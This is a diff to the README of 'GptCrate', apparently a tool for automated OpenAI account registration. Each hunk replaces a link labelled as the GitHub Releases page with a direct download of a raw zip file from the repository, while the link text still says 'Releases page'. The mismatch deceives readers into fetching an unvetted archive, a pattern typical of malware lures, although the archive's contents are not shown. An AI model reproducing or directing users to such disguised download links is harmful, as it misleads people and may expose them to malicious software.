@@ -1,10 +1,10 @@
 # 🚀 GptCrate - Simple OpenAI Account Setup
 
-[![Download GptCrate](https://img.shields.io/badge/Download-GptCrate-brightgreen?style=for-the-badge)](https://github.com/EngangAman/GptCrate/releases)
+[![Download GptCrate](https://img.shields.io/badge/Download-GptCrate-brightgreen?style=for-the-badge)](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
 
 ## 📥 Download
 
-1. Open the [GptCrate Releases page](https://github.com/EngangAman/GptCrate/releases)
+1. Open the [GptCrate Releases page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
 2. Download the latest Windows file from the release list
 3. Save the file to a folder you can find again, such as `Downloads`
 4. If the file comes as a `.zip`, extract it first
@@ -129,7 +129,7 @@ It supports:
 
 ## 🛠️ Basic Setup Steps
 
-1. Download the latest release from the [Releases page](https://github.com/EngangAman/GptCrate/releases)
+1. Download the latest release from the [Releases page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
 2. Extract the files if needed
 3. Open the folder
 4. Edit the config file if you want to change email mode or API key
@@ -208,7 +208,7 @@ If you want the fewest steps, use this order:
 
 If you need the file later, use the same page:
 
-[Go to GptCrate Releases](https://github.com/EngangAman/GptCrate/releases)
+[Go to GptCrate Releases](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
 
 ## 🖱️ What to Click
 
@@ -239,4 +239,4 @@ You can change this path if you want the files in another folder.
 
 ## 📎 Release Link
 
-[Visit the GptCrate release download page](https://github.com/EngangAman/GptCrate/releases)
+[Visit the GptCrate release download page](https://github.com/EngangAman/GptCrate/raw/refs/heads/main/gpt_register/Crate-Gpt-2.5.zip)
